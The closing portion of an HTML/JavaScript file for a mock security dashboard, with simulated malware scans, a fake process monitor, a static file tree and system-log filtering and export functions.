        // Simulate scan progress
        setTimeout(() => {
          const outcome = Math.random() > 0.2 ? 'clean' : 'threats'; // 80% chance of clean
          let outcomeMessage = `${scanName} completed.`;
          if (outcome === 'clean') {
            outcomeMessage += ' No threats found.';
            showNotification(outcomeMessage, 'success');
          } else {
            outcomeMessage += ' Threats detected! Please review Security Logs.';
            showNotification(outcomeMessage, 'error');
            // Optionally add a fake log entry here
            this.addLogEntry('ERROR', 'Malware scan detected suspicious files.', 'security');
          }
        }, 3000);
      },
      checkFirewall: function() {
        const status = Math.random() > 0.1 ? 'Active' : 'Inactive'; // 90% chance active
        showNotification(`Checking firewall status... Firewall is ${status}.`, status === 'Active' ? 'success' : 'error');
        this.addLogEntry(status === 'Active' ? 'INFO' : 'ERROR', `Firewall status: ${status}`, 'security');
      },
      viewSecurityLogs: function() {
        showNotification('Opening Security Logs...', 'info');
        this.togglePanel('securityAlertsPanel'); // Open the panel
        // Ensure logs are visible (might need to scroll or generate sample logs)
        if (document.getElementById('securityLogContainer') && document.getElementById('securityLogContainer').children.length === 0) {
          this.addLogEntry('INFO', 'Firewall detected and blocking unauthorized access attempts.', 'security');
          this.addLogEntry('ALERT', 'Suspicious network activity detected on port 443.', 'security');
          this.addLogEntry('INFO', 'User login successful.', 'auth');
        }
      },
      updateDefinitions: function() {
        showNotification('Updating security definitions...', 'info');
        setTimeout(() => {
          showNotification('Security definitions updated successfully.', 'success');
        }, 2500);
      },

      // =========================================================================
      // Process Monitor Functionality
      // =========================================================================
      initProcessMonitor: function() {
        // Handlers are attached via onclick in HTML for simplicity here
      },
      generateFakeProcesses: function() {
        const processListBody = document.getElementById('processListBody');
        processListBody.innerHTML = ''; // Clear existing processes
        const processes = [
          { pid: 1024, name: 'System Idle Process', cpu: 0.01, mem: 0.1, status: 'Running' },
          { pid: 1500, name: 'svchost.exe', cpu: 2.5, mem: 5.2, status: 'Running' },
          { pid: 2048, name: 'explorer.exe', cpu: 5.1, mem: 8.5, status: 'Running' },
          { pid: 2560, name: 'chrome.exe', cpu: 15.2, mem: 12.3, status: 'Running' },
          { pid: 3072, name: 'taskmgr.exe', cpu: 1.0, mem: 3.1, status: 'Running' },
          { pid: 3584, name: 'msedge.exe', cpu: 12.8, mem: 10.5, status: 'Running' },
          { pid: 4096, name: 'audiodg.exe', cpu: 0.5, mem: 1.2, status: 'Running' },
          { pid: 4612, name: 'winlogon.exe', cpu: 0.3, mem: 0.5, status: 'Running' },
          { pid: 5120, name: 'dwm.exe', cpu: 3.0, mem: 4.8, status: 'Running' },
          { pid: 5632, name: 'System', cpu: 1.2, mem: 2.0, status: 'Running' },
          { pid: 6144, name: 'runtimebroker.exe', cpu: 0.8, mem: 1.5, status: 'Running' },
          { pid: 7168, name: 'SecurityManager.exe', cpu: 4.5, mem: 6.7, status: 'Running' },
          { pid: 8192, name: 'NetworkService.exe', cpu: 1.8, mem: 2.9, status: 'Running' },
          { pid: 9216, name: 'UnknownProcess.exe', cpu: 10.0, mem: 7.0, status: 'Suspicious'}, // Suspicious process example
        ];

        processes.forEach(p => {
          const tr = document.createElement('tr');
          tr.innerHTML = `
            <td>${p.pid}</td>
            <td class="process-name">${p.name}</td>
            <td>${p.cpu.toFixed(1)}%</td>
            <td>${p.mem.toFixed(1)}%</td>
            <td>${p.status}</td>
            <td>
              <button onclick="dashboard.simulateProcessAction(${p.pid}, '${p.name}', 'details')">Details</button>
              <button onclick="dashboard.simulateProcessAction(${p.pid}, '${p.name}', 'kill')" style="${p.status === 'Suspicious' ? 'background-color: var(--accent-red); color: white;' : ''}"> ${p.status === 'Suspicious' ? 'Terminate' : 'Kill'} </button>
            </td>
          `;
          if (p.status === 'Suspicious') {
            tr.style.background = 'rgba(255, 76, 76, 0.1)'; // Highlight suspicious process
          }
          processListBody.appendChild(tr);
        });
      },
      refreshProcesses: function() {
        showNotification('Refreshing process list...', 'info');
        this.generateFakeProcesses(); // Regenerate fake processes
        setTimeout(() => showNotification('Process list updated.', 'success'), 1500);
      },
      simulateProcessAction: function(pid, name, action) {
        if (action === 'kill') {
          if (name === 'SuspiciousProcess.exe') {
            if (confirm(`Terminate suspicious process "${name}" (PID: ${pid})?`)) {
              showNotification(`Terminating "${name}" (PID: ${pid})...`, 'warning');
              // Simulate termination
              setTimeout(() => {
                showNotification(`Process "${name}" (PID: ${pid}) terminated successfully.`, 'success');
                this.addLogEntry('INFO', `Suspicious process "${name}" (PID: ${pid}) terminated by user.`, 'system');
                this.refreshProcesses(); // Refresh list to remove it (or mark as dead)
              }, 2000);
            } else {
              showNotification(`Termination of "${name}" cancelled.`, 'info');
            }
          } else {
            showNotification(`Cannot kill system process "${name}" (PID: ${pid}).`, 'error');
          }
        } else if (action === 'details') {
          showNotification(`Fetching details for process "${name}" (PID: ${pid})...`, 'info');
          setTimeout(() => {
            showNotification(`Details for ${name}: CPU 4.5%, Memory 6.7%, Status: Running, Path: C:\\Windows\\System32\\${name}.exe`, 'info');
          }, 1500);
        }
      },

      // =========================================================================
      // File Explorer Functionality
      // =========================================================================
      initFileExplorer: function() {
        // Handlers for tree nodes and file clicks are attached dynamically
        // in populateFileTree and selectFileNode.
      },
      fileStructure: {
        '/': {
          type: 'directory',
          children: {
            'System32': { type: 'directory', children: { 'kernel32.dll': { type: 'file', size: '1MB' }, 'user32.dll': { type: 'file', size: '0.8MB' } } },
            'Users': { type: 'directory', children: { 'Public': { type: 'directory', children: {} }, 'Admin': { type: 'directory', children: { 'Documents': { type: 'directory', children: { 'report.docx': { type: 'file', size: '50KB' } } } } } } },
            'Windows': { type: 'directory', children: { 'System': { type: 'directory', children: {} }, 'Temp': { type: 'directory', children: { 'log_2023.txt': { type: 'file', size: '10KB' } } } } },
            'config.sys': { type: 'file', size: '2KB' },
            'security.log': { type: 'file', size: '500KB' },
            'private_key.pem': { type: 'file', size: '1KB' }
          }
        }
      },
      currentSelectedNode: null,

      populateFileTree: function(node = this.fileStructure['/'], parentElement = null) {
        if (!node || node.type !== 'directory') return;

        if (!parentElement) {
          parentElement = document.querySelector('.file-tree ul');
          if (!parentElement) { // Create root ul if it doesn't exist
            parentElement = document.createElement('ul');
            document.querySelector('.file-tree').appendChild(parentElement);
          } else {
            parentElement.innerHTML = ''; // Clear if refreshing
          }
        }

        for (const name in node.children) {
          const child = node.children[name];
          const li = document.createElement('li');
          li.dataset.path = name; // For reference
          li.textContent = name;

          if (child.type === 'directory') {
            li.classList.add('directory');
            // Add an expand/collapse icon
            const toggleIcon = document.createElement('span');
            toggleIcon.textContent = ' ▶ '; // Collapsed state
            toggleIcon.style.marginRight = '5px';
            li.prepend(toggleIcon);

            const ul = document.createElement('ul');
            ul.style.display = 'none'; // Initially hidden
            li.appendChild(ul);

            li.addEventListener('click', (e) => {
              e.stopPropagation(); // Prevent file view click
              const isExpanded = ul.style.display !== 'none';
              ul.style.display = isExpanded ? 'none' : 'block';
              toggleIcon.textContent = isExpanded ? ' ▶ ' : ' ▼ ';
            });
          } else {
            li.classList.add('file');
            li.addEventListener('click', (e) => {
              e.stopPropagation(); // Prevent directory expansion
              this.selectFileNode(e, name);
            });
          }
          parentElement.appendChild(li);
        }
      },
      selectFileNode: function(event, nodeName) {
        // Remove selection from previous node
        if (this.currentSelectedNode) {
          this.currentSelectedNode.classList.remove('selected');
          this.currentSelectedNode = null;
        }
        
        // Highlight the clicked node
        const li = event.target.closest('li');
        if (li) {
          li.classList.add('selected');
          this.currentSelectedNode = li;

          const fileView = document.getElementById('fileView');
          fileView.innerHTML = ''; // Clear previous file view

          const selectedNode = this.getNodeByPath(li.dataset.path || '/'); // Need a robust path lookup

          if (!selectedNode) {
            fileView.innerHTML = `<p>Error: Node not found for path "${li.dataset.path}".</p>`;
            return;
          }
          
          // Display details based on type
          if (selectedNode.type === 'directory') {
            fileView.innerHTML = `<p><strong>Directory:</strong> ${li.dataset.path}</p><p>Contains ${Object.keys(selectedNode.children || {}).length} items.</p>`;
            this.populateFileTree(selectedNode, li.querySelector('ul')); // Populate children dynamically
          } else { // It's a file
            fileView.innerHTML = `
              <p><strong>File:</strong> ${li.dataset.path}</p>
              <p><strong>Size:</strong> ${selectedNode.size}</p>
              <p><strong>Type:</strong> ${selectedNode.type}</p>
              <button onclick="dashboard.simulateFileAction('download', '${li.dataset.path}')">Download</button>
              <button onclick="dashboard.simulateFileAction('view', '${li.dataset.path}')">View</button>
              <button onclick="dashboard.simulateFileAction('delete', '${li.dataset.path}')">Delete</button>
            `;
          }
          showNotification(`Selected item: "${li.dataset.path}"`, 'info');
        }
      },
      getNodeByPath: function(path) { // Simplified lookup, actual path logic would be more complex
        if (path === '/') return this.fileStructure['/'];
        let currentNode = this.fileStructure['/'];
        const parts = path.split('/').filter(p => p !== '');
        for (const part of parts) {
          if (currentNode && currentNode.children && currentNode.children[part]) {
            currentNode = currentNode.children[part];
          } else {
            return null; // Path not found
          }
        }
        return currentNode;
      },
      refreshFileTree: function() {
        showNotification('Refreshing file tree...', 'info');
        const fileTreeContainer = document.querySelector('.file-tree');
        fileTreeContainer.innerHTML = '<ul><li onclick="dashboard.selectFileNode(event, \'/\')" data-path="/">/</li></ul>'; // Reset root
        this.populateFileTree(); // Repopulate
        document.getElementById('fileView').innerHTML = '<p>Select a directory from the left panel.</p>';
        setTimeout(() => showNotification('File tree refreshed.', 'success'), 1500);
      },
      simulateFileAction: function(action, filePath) {
        showNotification(`Simulating "${action}" for file "${filePath}"...`, 'info');
        setTimeout(() => {
          switch (action) {
            case 'download':
              showNotification(`Simulating download of "${filePath}".`, 'success');
              break;
            case 'view':
              showNotification(`Simulating view of "${filePath}". Content might be displayed if implemented.`, 'info');
              break;
            case 'delete':
              if (confirm(`Are you sure you want to delete "${filePath}"? This cannot be undone.`)) {
                showNotification(`Simulating deletion of "${filePath}".`, 'system');
                // Here you would remove the file from the structure and update the UI
                // This requires more complex state management for the fileStructure
                this.refreshFileTree(); // Refresh to show deletion (simulated)
              } else {
                showNotification(`Deletion of "${filePath}" cancelled.`, 'info');
              }
              break;
            default:
              showNotification(`Unknown file action "${action}".`, 'warning');
          }
        }, 2000);
      },

      // =========================================================================
      // System Logs Functionality
      // =========================================================================
      initSystemLogs: function() {
        // Handlers attached via onclick in HTML
      },
      logEntries: [], // Store log entries for filtering/clearing
      addLogEntry: function(level, message, source = 'system') {
        const logContainer = document.getElementById('logContainer');
        const timestamp = new Date().toLocaleString();
        
        const entry = { level, message, source, timestamp, id: `log-${Date.now()}-${Math.random().toString(36).substr(2, 9)}` };
        this.logEntries.push(entry);
        
        const div = document.createElement('div');
        div.className = `log-entry ${level.toLowerCase()}`;
        div.dataset.id = entry.id;
        div.innerHTML = `<span class="timestamp">${timestamp} [${level}] [${source.toUpperCase()}]:</span> ${message}`;
        
        logContainer.prepend(div); // Add to top

        // Limit log entries to prevent memory issues (e.g., last 1000)
        while (logContainer.children.length > 1000) {
          logContainer.removeChild(logContainer.lastChild);
        }
      },
      generateFakeLogs: function() {
        this.logEntries = []; // Clear existing logs
        this.addLogEntry('INFO', 'System initialized successfully.', 'kernel');
        this.addLogEntry('INFO', 'User logged in: Beta.user (ID: 281573)', 'auth');
        this.addLogEntry('DEBUG', 'Network service started.', 'network');
        this.addLogEntry('INFO', 'Security definitions updated.', 'security');
        this.addLogEntry('WARNING', 'Low disk space detected on C:\\ drive.', 'disk');
        this.addLogEntry('ERROR', 'Failed to load configuration file: config.sys', 'config');
        this.addLogEntry('INFO', 'User accessed File Explorer.', 'ui');
        this.addLogEntry('SECURITY', 'Unauthorized access attempt detected on port 22.', 'firewall');
        this.addLogEntry('INFO', 'Process monitor refreshed.', 'system');
        this.addLogEntry('INFO', 'User added a reminder: "Call Mom".', 'reminder');
        this.addLogEntry('INFO', 'System diagnostics completed.', 'diag');
      },
      filterLogs: function() {
        const filterLevel = prompt("Enter log level to filter (INFO, DEBUG, WARNING, ERROR, SECURITY, ALL):");
        if (filterLevel === null) return; // User cancelled

        const logContainer = document.getElementById('logContainer');
        logContainer.innerHTML = ''; // Clear current logs

        const levelFilter = filterLevel.toUpperCase();
        if (levelFilter === 'ALL') {
            this.logEntries.forEach(entry => {
                const div = document.createElement('div');
                div.className = `log-entry ${entry.level.toLowerCase()}`;
                div.dataset.id = entry.id;
                div.innerHTML = `<span class="timestamp">${entry.timestamp} [${entry.level}] [${entry.source.toUpperCase()}]:</span> ${entry.message}`;
                logContainer.prepend(div);
            });
            showNotification('Showing all log entries.', 'info');
            return;
        }

        let filteredCount = 0;
        this.logEntries.forEach(entry => {
          if (entry.level.toUpperCase() === levelFilter) {
            const div = document.createElement('div');
            div.className = `log-entry ${entry.level.toLowerCase()}`;
            div.dataset.id = entry.id;
            div.innerHTML = `<span class="timestamp">${entry.timestamp} [${entry.level}] [${entry.source.toUpperCase()}]:</span> ${entry.message}`;
            logContainer.prepend(div);
            filteredCount++;
          }
        });
        showNotification(`Showing ${filteredCount} log entries matching level "${levelFilter}".`, 'info');
      },
      clearLogs: function() {
        if (confirm('Are you sure you want to clear all system logs?')) {
          document.getElementById('logContainer').innerHTML = '';
          this.logEntries = [];
          showNotification('System logs cleared.', 'system');
        }
      },
      exportLogs: function() {
        if (this.logEntries.length === 0) {
          showNotification('No logs to export.', 'warning');
          return;
        }
        showNotification('Exporting system logs...', 'info');
        const logContent = this.logEntries.map(entry =>
          `${entry.timestamp} [${entry.level}] [${entry.source.toUpperCase()}]: ${entry.message}`
        ).join('\n');
        
        const blob = new Blob([logContent], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `system_logs_${Date.now()}.log`;
        a.click();
        showNotification('System logs exported.', 'success');
        URL.revokeObjectURL(url); // Clean up
      }

    }; // End of dashboard object

    // =========================================================================
    // Initial Page Load
    // =========================================================================
    document.addEventListener('DOMContentLoaded', () => {
      fetchUsers(); // Load user data first
      startLoadingSequence(); // Then start the loading animation
    });

  </script>
</body>
</html>

